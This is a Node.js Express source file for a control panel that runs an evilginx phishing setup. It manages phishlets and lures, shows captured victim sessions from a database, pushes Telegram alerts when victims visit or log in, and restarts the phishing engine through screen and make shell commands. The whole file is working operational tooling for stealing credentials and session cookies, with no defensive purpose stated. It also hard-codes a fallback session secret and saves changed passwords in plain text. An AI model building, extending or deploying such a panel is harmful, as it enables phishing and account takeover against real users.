if (process.env.NODE_ENV !== 'production') {
  try {
    require('dotenv').config();
  } catch (e) {
    console.log('dotenv module not found, skipping .env loading');
  }
}

const express = require('express')
const app = express()
const path = require('path');
var fs = require('fs');
const users = require('./users')
const passport = require('passport')
const bcrypt = require('bcrypt')
const flash = require('express-flash')
const session = require('express-session')
const { exec, spawn } = require('child_process');
const https = require('https');

app.set('views', path.join(__dirname, 'views'));
app.use(express.static(__dirname + "/public/"));
app.set('view-engine', 'ejs');
const logger = require('morgan');
app.use(logger('dev'));
//////////////////
app.use(express.urlencoded({
  extended: false
}));

const initializePassport = require('./passport-config')

initializePassport(
  passport,
  name => users.find(user => user.name === name),
  id => users.find(user => user.id === id)
)

app.use(express.json())
app.use(flash())
app.use(session({
  secret: process.env.SESSION_SECRET || 'evil_secret_key',
  resave: false,
  saveUninitialized: false
}))

app.use(passport.initialize())
app.use(passport.session())



//////////////////
// Helper functions
const settingsPath = path.join(__dirname, '../config/settings.json');

const configPath = path.join(__dirname, '../config/config.yaml');

// Lure Management Helpers
function getLuresAndDomains() {
  try {
    if (fs.existsSync(configPath)) {
      const content = fs.readFileSync(configPath, 'utf8');

      // Extract global server fallback
      let globalServer = '';
      const serverMatch = content.match(/^server:\s*(.*)$/m);
      if (serverMatch && serverMatch[1]) {
        globalServer = serverMatch[1].trim().replace(/^"|"$/g, '');
      }

      // Extract site_domains mapping
      const domainMap = {};
      const domainsMatch = content.match(/^site_domains:\n([\s\S]*?)(?:^[a-zA-Z_0-9]+:|\Z)/m);
      if (domainsMatch && domainsMatch[1]) {
        const lines = domainsMatch[1].split('\n');
        for (const line of lines) {
          const parts = line.split(':');
          if (parts.length >= 2 && line.trim().length > 0) {
            domainMap[parts[0].trim()] = parts.slice(1).join(':').trim().replace(/^"|"$/g, '');
          }
        }
      }

      // Basic regex parsing for lures block
      const luresMatch = content.match(/^lures:\n([\s\S]*?)(?:^[a-zA-Z_0-9]+:|\Z)/m);

      let lures = [];
      if (luresMatch && luresMatch[1]) {
        const luresBlock = luresMatch[1];
        let currentLure = null;

        const lines = luresBlock.split('\n');
        for (const line of lines) {
          if (!line.trim()) continue;

          if (line.match(/^\s+-\s+hostname:/)) {
            if (currentLure) lures.push(currentLure);
            currentLure = { hostname: line.split('hostname:')[1].trim().replace(/^"|"$/g, '') };
          } else if (currentLure) {
            const match = line.match(/^\s+([a-zA-Z_0-9]+):\s*(.*)$/);
            if (match) {
              const key = match[1];
              let val = match[2].trim();
              if (val.startsWith('"') && val.endsWith('"')) val = val.slice(1, -1);
              currentLure[key] = val;
            }
          }
        }
        if (currentLure) lures.push(currentLure);

        // Resolve blank hostnames
        lures.forEach(lure => {
          if (!lure.hostname || lure.hostname === '') {
            lure.hostname = domainMap[lure.phishlet] || globalServer || 'unknown-domain';
          }
        });
      }
      return { lures, domainMap, globalServer };
    }
  } catch (e) { console.log('Error reading config.yaml', e); }
  return { lures: [], domainMap: {}, globalServer: '' };
}

function getPhishlets() {
  try {
    if (fs.existsSync(configPath)) {
      const content = fs.readFileSync(configPath, 'utf8');
      const match = content.match(/^sites_enabled:\n([\s\S]*?)(?:^[a-zA-Z_0-9]+:|\Z)/m);
      if (match && match[1]) {
        return match[1].split('\n')
          .filter(l => l.trim().startsWith('-'))
          .map(l => l.replace(/^\s*-\s*/, '').trim());
      }
    }
  } catch (e) { console.log('Error reading phishlets', e); }
  return [];
}

function ensureFilesExist() {
  const dbPath = path.join(__dirname, '../config/data.db');
  if (!fs.existsSync(dbPath)) {
    try { fs.writeFileSync(dbPath, '', 'utf8'); } catch (e) { }
  }
  if (!fs.existsSync(settingsPath)) {
    try { fs.writeFileSync(settingsPath, '{}', 'utf8'); } catch (e) { }
  }
  if (!fs.existsSync(configPath)) {
    try { fs.writeFileSync(configPath, '', 'utf8'); } catch (e) { }
  }
}

// Function to read Telegram config from YAML using regex
function readYamlConfig() {
  try {
    if (fs.existsSync(configPath)) {
      const content = fs.readFileSync(configPath, 'utf8');
      const webhookMatch = content.match(/^webhook_telegram:\s*"(.*)"\s*$/m) || content.match(/^webhook_telegram:\s*(.*)\s*$/m);

      let token = '';
      let chatid = '';

      if (webhookMatch && webhookMatch[1]) {
        const parts = webhookMatch[1].trim().split('/');
        if (parts.length >= 2) {
          token = parts.slice(0, parts.length - 1).join('/'); // In case token has slashes
          chatid = parts[parts.length - 1];
        }
      }
      return { token, chatid, rawContent: content };
    }
  } catch (e) { console.log('Error reading config.yaml', e); }
  return { token: '', chatid: '', rawContent: '' };
}

// Function to write Telegram config to YAML
function writeYamlConfig(token, chatid, notifyVisit) {
  try {
    if (!fs.existsSync(configPath)) return;

    let content = fs.readFileSync(configPath, 'utf8');
    // Ensure the token/chatid string is wrapped in quotes because telegram tokens contain a colon which breaks Strict YAML
    const webhookVal = token && chatid ? `"${token}/${chatid}"` : '""';

    // Check if key exists
    if (/^webhook_telegram:/m.test(content)) {
      content = content.replace(/^webhook_telegram:.*$/m, `webhook_telegram: ${webhookVal}`);
    } else {
      content += `\nwebhook_telegram: ${webhookVal}\n`;
    }

    // Handle notify_visit
    const notifyVisitVal = notifyVisit ? 'true' : 'false';
    if (/^notify_visit:/m.test(content)) {
      content = content.replace(/^notify_visit:.*$/m, `notify_visit: ${notifyVisitVal}`);
    } else {
      content += `notify_visit: ${notifyVisitVal}\n`;
    }

    fs.writeFileSync(configPath, content, 'utf8');
  } catch (e) { console.log('Error writing config.yaml', e); }
}

function loadSettings() {
  try {
    if (fs.existsSync(settingsPath)) {
      return JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
    }
  } catch (e) { console.log('Error loading settings', e); }
  return {};
}

function getPhishletSubdomains() {
  const mapping = {};
  const phishletsDir = path.join(__dirname, '../phishlets');
  try {
    if (fs.existsSync(phishletsDir)) {
      const files = fs.readdirSync(phishletsDir);
      for (const file of files) {
        if (file.endsWith('.yaml')) {
          const content = fs.readFileSync(path.join(phishletsDir, file), 'utf8');
          const pName = file.replace('.yaml', '');
          // Look for phish_sub where is_landing: true
          const match = content.match(/phish_sub:\s*["']?([^"'\s,]+)["']?.*is_landing:\s*true/);
          if (match && match[1]) {
            mapping[pName] = match[1];
          }
        }
      }
    }
  } catch (e) { console.log('Error reading phishlets subdomains', e); }
  return mapping;
}

// Restart logic: gracefully exit evilginx and run make
function restartEvilginx() {
  console.log('Initiating restart sequence...');
  const rootDir = process.env.EVIL_ROOT || path.resolve(__dirname, '..'); // Dynamic: resolves to the project root

  // Step 1: Send 'exit' to gracefully stop evilginx inside the screen
  exec('screen -S office -X stuff "exit\\n"', (err) => {
    // Also send SIGTERM just to be absolutely sure it stops
    exec('pkill -SIGTERM evilginx');

    // Step 2: Wait 3 seconds for graceful shutdown
    setTimeout(() => {
      // Step 3: Ensure any dead screens are wiped
      exec('screen -wipe', () => {
        // Step 4: Close any lingering office screen
        exec('screen -S office -X quit', () => {
          setTimeout(() => {
            // Step 5: Create a new detached screen session
            exec('screen -dmS office', (err) => {
              if (err) {
                console.log('Error creating screen:', err.message);
                return;
              }

              // Step 6: Send the cd && make command
              const cmd = `cd ${rootDir} && make\\n`;
              setTimeout(() => {
                exec(`screen -S office -X stuff "${cmd}"`, (err) => {
                  if (err) console.log('Error sending make command:', err.message);
                  else console.log(' restarted successfully.');
                });
              }, 1000);
            });
          }, 500);
        });
      });
    }, 3000);
  });
}

function saveSettings(settings) {
  try {
    fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2), 'utf8');
  } catch (e) { console.log('Error saving settings', e); }
}

function updateUserPassword(username, newPass) {
  try {
    const user = users.find(u => u.name === username);
    if (user) {
      user.password = newPass;
      // Note: In a real app we would write to users.json, but users is require()d 
      // so we'll just update memory for this running instance + try write
      fs.writeFileSync(path.join(__dirname, 'users.json'), JSON.stringify(users, null, 4), 'utf8');
    }
  } catch (e) { console.log('Error updating password', e); }
}

function sendTelegramMessage(token, chatId, message) {
  return new Promise((resolve, reject) => {
    if (!token || !chatId) {
      return reject('Missing Telegram Token or Chat ID');
    }

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const data = JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    });

    const req = https.request(url, {
      method: 'POST',
      family: 4, // Force IPv4 to bypass broken VPS IPv6
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    }, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          if (!body) return reject(`Empty response (Status: ${res.statusCode})`);
          const response = JSON.parse(body);
          if (response.ok) {
            resolve(true);
          } else {
            reject(response.description || `Telegram Error ${res.statusCode}`);
          }
        } catch (e) {
          reject(`Failed to parse Telegram response: ${e.message}`);
        }
      });
    });

    req.on('timeout', () => {
      req.destroy();
      reject('Connection to Telegram timed out after 10 seconds');
    });

    req.on('error', (err) => reject(`Network error: ${err.message}`));
    req.write(data);
    req.end();
  });
}

app.get('/', checkAuthenticated, async (req, res) => {
  const dbPath = path.join(__dirname, '../config/data.db');

  ensureFilesExist();
  const settings = loadSettings();

  // Try reading from config path first, fallback to local if needed
  let finalPath = dbPath;
  if (!fs.existsSync(dbPath) && fs.existsSync('data.db')) {
    finalPath = 'data.db';
  }

  // ROBUST DB PARSING FIX
  fs.readFile(finalPath, 'UTF-8', (err, file) => {
    if (err) {
      console.log('Error reading DB:', err);
      return res.render('index.ejs', { data: [], settings: settings, lures: getLuresAndDomains().lures });
    } else {
      // Split by newline, safely handling both CRLF (Windows) and LF (Unix) - Redis AOF format
      const lines = file.split(/\r?\n/);
      const data = [];
      const uniqueSessions = {};
      lines.forEach(line => {
        const trimmed = line.trim();
        if (trimmed.startsWith('{') && trimmed.endsWith('}')) {
          try {
            const item = JSON.parse(trimmed);
            const sid = item.session_id || item.id || item.sessionId;
            if (sid) {
              uniqueSessions[sid] = item;
            } else {
              data.push(item);
            }
          } catch (e) { }
        }
      });
      
      const deduplicatedData = [...data, ...Object.values(uniqueSessions)];
      
      // Sort by time (latest first) to ensure chronological order is preserved after deduplication
      deduplicatedData.sort((a, b) => {
        const timeA = a.update_time || a.create_time || 0;
        const timeB = b.update_time || b.create_time || 0;
        return timeB - timeA;
      });

      res.render('index.ejs', {
        data: deduplicatedData,
        settings: settings,
        lures: getLuresAndDomains().lures,
        phishletSubdomains: getPhishletSubdomains()
      });
    }
  });
});

app.get('/settings', checkAuthenticated, (req, res) => {
  const settings = loadSettings();
  const yamlConfig = readYamlConfig();
  const { domainMap, globalServer } = getLuresAndDomains();

  // Override panel settings with truth from config.yaml if present
  if (yamlConfig.token && yamlConfig.chatid) {
    settings.telegram_token = yamlConfig.token;
    settings.telegram_chatid = yamlConfig.chatid;
  }

  res.render('settings.ejs', {
    settings: settings,
    req: req,
    phishlets: getPhishlets(),
    domainMap: domainMap,
    globalServer: globalServer,
    phishletSubdomains: getPhishletSubdomains()
  });
});

app.post('/settings/telegram', checkAuthenticated, (req, res) => {
  const newSettings = loadSettings();
  newSettings.telegram_token = req.body.telegram_token;
  newSettings.telegram_chatid = req.body.telegram_chatid;
  newSettings.notify_login = req.body.notify_login === 'on';
  newSettings.notify_visit = req.body.notify_visit === 'on';
  newSettings.enable_captcha = req.body.enable_captcha === 'on';

  saveSettings(newSettings);
  writeYamlConfig(req.body.telegram_token, req.body.telegram_chatid, newSettings.notify_visit);

  req.flash('success', 'Telegram settings saved. Engine is automatically restarting in the background...');
  restartEvilginx();
  res.redirect('/settings');
});

app.post('/settings/password', checkAuthenticated, (req, res) => {
  if (req.body.new_password && req.body.new_password.trim() !== "") {
    updateUserPassword(req.user.name, req.body.new_password);
    req.flash('success', 'Password updated successfully.');
  } else {
    req.flash('error', 'New password cannot be empty.');
  }
  res.redirect('/settings');
});

app.post('/settings', checkAuthenticated, (req, res) => {
  // Legacy route for compatibility, redirects to /settings/telegram for now
  res.redirect('/settings');
});

// LURE MANAGEMENT ENDPOINTS
app.post('/create-lure', checkAuthenticated, (req, res) => {
  let { host, path, redirect, phishlet } = req.body;
  if (!path || !phishlet) {
    req.flash('error', 'Path and phishlet are required.');
    return res.redirect('/settings');
  }

  // Resolve host if not provided by user
  if (!host || host.trim() === "") {
    const { domainMap, globalServer } = getLuresAndDomains();
    host = domainMap[phishlet] || globalServer || "";
  }

  try {
    if (fs.existsSync(configPath)) {
      let content = fs.readFileSync(configPath, 'utf8');

      const newLureYaml = `    - hostname: "${host}"
      path: ${path}
      redirect_url: "${redirect || ''}"
      phishlet: ${phishlet}
      template: ""
      ua_filter: ""
      info: ""
      og_title: ""
      og_desc: ""
      og_image: ""
      og_url: ""\n`;

      if (/^lures:/m.test(content)) {
        content = content.replace(/^lures:\n/m, `lures:\n${newLureYaml}`);
      } else {
        content += `\nlures:\n${newLureYaml}`;
      }

      fs.writeFileSync(configPath, content, 'utf8');
      req.flash('success', 'Lure created. Engine is automatically restarting to apply this lure...');
      restartEvilginx();
    }
  } catch (e) {
    console.log('Error creating lure', e);
    req.flash('error', 'Error creating lure.');
  }

  res.redirect('/settings');
});

app.post('/delete-lure', checkAuthenticated, (req, res) => {
  const { index } = req.body;

  try {
    if (fs.existsSync(configPath)) {
      let content = fs.readFileSync(configPath, 'utf8');
      const luresMatch = content.match(/^lures:\n([\s\S]*?)(?:^[a-zA-Z_0-9]+:|\Z)/m);

      if (luresMatch && luresMatch[1]) {
        const luresBlock = luresMatch[1];
        const lines = luresBlock.split('\n');

        let newLines = [];
        let currentIndex = -1;

        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          if (line.match(/^\s+-\s+hostname:/)) {
            currentIndex++;
          }
          if (currentIndex !== parseInt(index)) {
            newLines.push(line);
          }
        }

        const newLuresBlock = newLines.join('\n');
        content = content.replace(luresBlock, newLuresBlock + (newLines.length && !newLuresBlock.endsWith('\n') ? '\n' : ''));
        fs.writeFileSync(configPath, content, 'utf8');
        req.flash('success', 'Lure deleted. Engine is automatically restarting in the background...');
        restartEvilginx();
      }
    }
  } catch (e) {
    console.log('Error deleting lure', e);
    req.flash('error', 'Error deleting lure.');
  }

  res.redirect('/');
});

app.post('/test-telegram', checkAuthenticated, async (req, res) => {
  const settings = loadSettings();
  const yamlConfig = readYamlConfig();

  // Use config.yaml if available, fallback to settings.json
  const token = yamlConfig.token || settings.telegram_token;
  const chatid = yamlConfig.chatid || settings.telegram_chatid;

  if (!token || !chatid) {
    return res.json({ success: false, error: 'Telegram settings not configured.' });
  }

  try {
    await sendTelegramMessage(token, chatid, "<b>Success!</b> Your Telegram bot is connected successfully on this VPS.");
    res.json({ success: true });
  } catch (e) {
    res.json({ success: false, error: e.toString() });
  }
});

app.post('/logout', (req, res) => {
  req.logout((err) => {
    if (err) { return next(err); }
    res.redirect('/login');
  });
});

app.get('/login', checkNotAuthenticated, (req, res) => {
  res.render('login.ejs');
});

app.post('/login', checkNotAuthenticated, passport.authenticate('local', {
  successRedirect: '/',
  failureRedirect: '/login',
  failureFlash: true
}))

function checkAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return next()
  }
  res.redirect('/login')
}

function checkNotAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return res.redirect('/')
  }
  next()
}
const PORT = process.env.PORT || 7000;
console.log(`Server Running on Port ${PORT}...`)
app.listen(PORT)